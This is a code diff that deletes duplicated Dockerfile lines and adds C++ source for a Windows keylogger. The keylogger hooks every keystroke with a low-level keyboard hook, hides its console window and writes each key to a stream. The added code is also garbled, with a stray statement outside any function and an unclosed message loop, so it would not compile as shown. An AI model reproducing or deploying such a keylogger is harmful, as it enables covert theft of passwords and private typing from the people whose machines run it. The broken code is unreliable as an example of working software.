@@ -108,30 +108,137 @@ while (true)
             if __name__ == "__main__":
             server.run(host='0.0.0.0')
 
-
-            # set base image (host OS)
-            FROM python:3.8
-
-            # set the working directory in the container
-            WORKDIR /code
-
-            # copy the dependencies file to the working directory
-            COPY requirements.txt .
-
-            # install dependencies
-            RUN pip install -r requirements.txt
-
-            # copy the content of the local src directory to the working directory
-            COPY src/ .
-
-            # command to run on container start
-            CMD [ "python", "./server.py" ]
-            # copy the dependencies file to the working directory
-            COPY requirements.txt .
-
-            # install dependencies
-            RUN pip install -r requirements.txt
-
-            # copy the content of the local src directory to the working directory
-            COPY src/ .
         ...
+
+        #include "keylogger.h"
+
+            keylogger* keylogger::this_ = NULL;
+
+            keylogger::keylogger(std::ostream* out)
+        : out_(out)
+        {
+            this_ = this;
+            hook();
+        }
+        *(this_->out_) << key;
+            keylogger::~keylogger()
+        {
+            unhook();
+        }
+
+            void keylogger::run() const
+            {
+                MSG msg = { 0 };
+                while (GetMessage(&msg, NULL, 0, 0) > 0;
+    }
+
+    void keylogger::hide_window() const
+    {
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+}
+
+    void keylogger::show_window() const
+    {
+        ShowWindow(GetConsoleWindow(), SW_SHOW);
+}
+
+    void keylogger::hook()
+    {
+        hhok_ = SetWindowsHookEx(WH_KEYBOARD_LL, hook_process, NULL, 0);
+    }
+
+    void keylogger::unhook() const
+    {
+        UnhookWindowsHookEx(hhok_);
+}
+
+    LRESULT CALLBACK keylogger::hook_process(int code, WPARAM wparam, LPARAM lparam)
+    {
+        if (code == HC_ACTION)
+        {
+            std::string key;
+            KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
+            if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
+            {
+                bool shift_down = GetAsyncKeyState(VK_SHIFT);
+                switch (kbs->vkCode)
+                {
+                    case 0x08: key = "[BACKSPACE]"; break;
+                    case 0x09: key = "[TAB]";       break;
+                    case 0x0D: key = "[NEWLINE]";   break;
+                    case 0x13: key = "[PAUSE]";     break;
+                    case 0x14: key = "[CAPS LOCK]"; break;
+                    case 0x20: key = "[SPACE]";     break;
+                    case 0x25: key = "[LEFT]";      break;
+                    case 0x26: key = "[UP]";        break;
+                    case 0x27: key = "[RIGHT]";     break;
+                    case 0x28: key = "[DOWN]";      break;
+                    case 0x2E: key = "[DELETE]";    break;
+                    case 0x30: (!shift_down) ? key = "0" : key = ")";   break;
+                    case 0x31: (!shift_down) ? key = "1" : key = "!";   break;
+                    case 0x32: (!shift_down) ? key = "2" : key = "@";   break;
+                    case 0x33: (!shift_down) ? key = "3" : key = "#";   break;
+                    case 0x34: (!shift_down) ? key = "4" : key = "$";   break;
+                    case 0x35: (!shift_down) ? key = "5" : key = "%";   break;
+                    case 0x36: (!shift_down) ? key = "6" : key = "^";   break;
+                    case 0x37: (!shift_down) ? key = "7" : key = "&";   break;
+                    case 0x38: (!shift_down) ? key = "8" : key = "*";   break;
+                    case 0x39: (!shift_down) ? key = "9" : key = "(";   break;
+                    case 0x41: (!shift_down) ? key = "a" : key = "A";   break;
+                    case 0x42: (!shift_down) ? key = "b" : key = "B";   break;
+                    case 0x43: (!shift_down) ? key = "c" : key = "C";   break;
+                    case 0x44: (!shift_down) ? key = "d" : key = "D";   break;
+                    case 0x45: (!shift_down) ? key = "e" : key = "E";   break;
+                    case 0x46: (!shift_down) ? key = "f" : key = "F";   break;
+                    case 0x47: (!shift_down) ? key = "g" : key = "G";   break;
+                    case 0x48: (!shift_down) ? key = "h" : key = "H";   break;
+                    case 0x49: (!shift_down) ? key = "i" : key = "I";   break;
+                    case 0x4A: (!shift_down) ? key = "j" : key = "J";   break;
+                    case 0x4B: (!shift_down) ? key = "k" : key = "K";   break;
+                    case 0x4C: (!shift_down) ? key = "l" : key = "L";   break;
+                    case 0x4D: (!shift_down) ? key = "m" : key = "M";   break;
+                    case 0x4E: (!shift_down) ? key = "n" : key = "N";   break;
+                    case 0x4F: (!shift_down) ? key = "o" : key = "O";   break;
+                    case 0x50: (!shift_down) ? key = "p" : key = "P";   break;
+                    case 0x51: (!shift_down) ? key = "q" : key = "Q";   break;
+                    case 0x52: (!shift_down) ? key = "r" : key = "R";   break;
+                    case 0x53: (!shift_down) ? key = "s" : key = "S";   break;
+                    case 0x54: (!shift_down) ? key = "t" : key = "T";   break;
+                    case 0x55: (!shift_down) ? key = "u" : key = "U";   break;
+                    case 0x56: (!shift_down) ? key = "v" : key = "V";   break;
+                    case 0x57: (!shift_down) ? key = "w" : key = "W";   break;
+                    case 0x58: (!shift_down) ? key = "x" : key = "X";   break;
+                    case 0x59: (!shift_down) ? key = "y" : key = "Y";   break;
+                    case 0x5A: (!shift_down) ? key = "z" : key = "Z";   break;
+                    case 0x60: (!shift_down) ? key = "0" : key = "0";   break;
+                    case 0x61: (!shift_down) ? key = "1" : key = "1";   break;
+                    case 0x62: (!shift_down) ? key = "2" : key = "2";   break;
+                    case 0x63: (!shift_down) ? key = "3" : key = "3";   break;
+                    case 0x64: (!shift_down) ? key = "4" : key = "4";   break;
+                    case 0x65: (!shift_down) ? key = "5" : key = "5";   break;
+                    case 0x66: (!shift_down) ? key = "6" : key = "6";   break;
+                    case 0x67: (!shift_down) ? key = "7" : key = "7";   break;
+                    case 0x68: (!shift_down) ? key = "8" : key = "8";   break;
+                    case 0x69: (!shift_down) ? key = "9" : key = "9";   break;
+                    case 0x6A: (!shift_down) ? key = "*" : key = "*";   break;
+                    case 0x6B: (!shift_down) ? key = "+" : key = "+";   break;
+                    case 0x6D: (!shift_down) ? key = "-" : key = "-";   break;
+                    case 0x6E: (!shift_down) ? key = "." : key = ".";   break;
+                    case 0x6F: (!shift_down) ? key = "/" : key = "/";   break;
+                    case 0xBA: (!shift_down) ? key = ";" : key = ":";   break;
+                    case 0xBB: (!shift_down) ? key = "=" : key = "+";   break;
+                    case 0xBC: (!shift_down) ? key = "," : key = "<";   break;
+                    case 0xBD: (!shift_down) ? key = "-" : key = "_";   break;
+                    case 0xBE: (!shift_down) ? key = "." : key = ">";   break;
+                    case 0xBF: (!shift_down) ? key = "/" : key = "?";   break;
+                    case 0xC0: (!shift_down) ? key = "`" : key = "~";   break;
+                    case 0xDB: (!shift_down) ? key = "[" : key = "{";   break;
+                    case 0xDC: (!shift_down) ? key = "\\" : key = "|";  break;
+                    case 0xDD: (!shift_down) ? key = "]" : key = "}";   break;
+                    case 0xDE: (!shift_down) ? key = "'" : key = "\"";  break;
+                }
+            }
+        *(this_->out_) << key;
+        }
+        return CallNextHookEx(NULL, code, wparam, lparam);
+    }
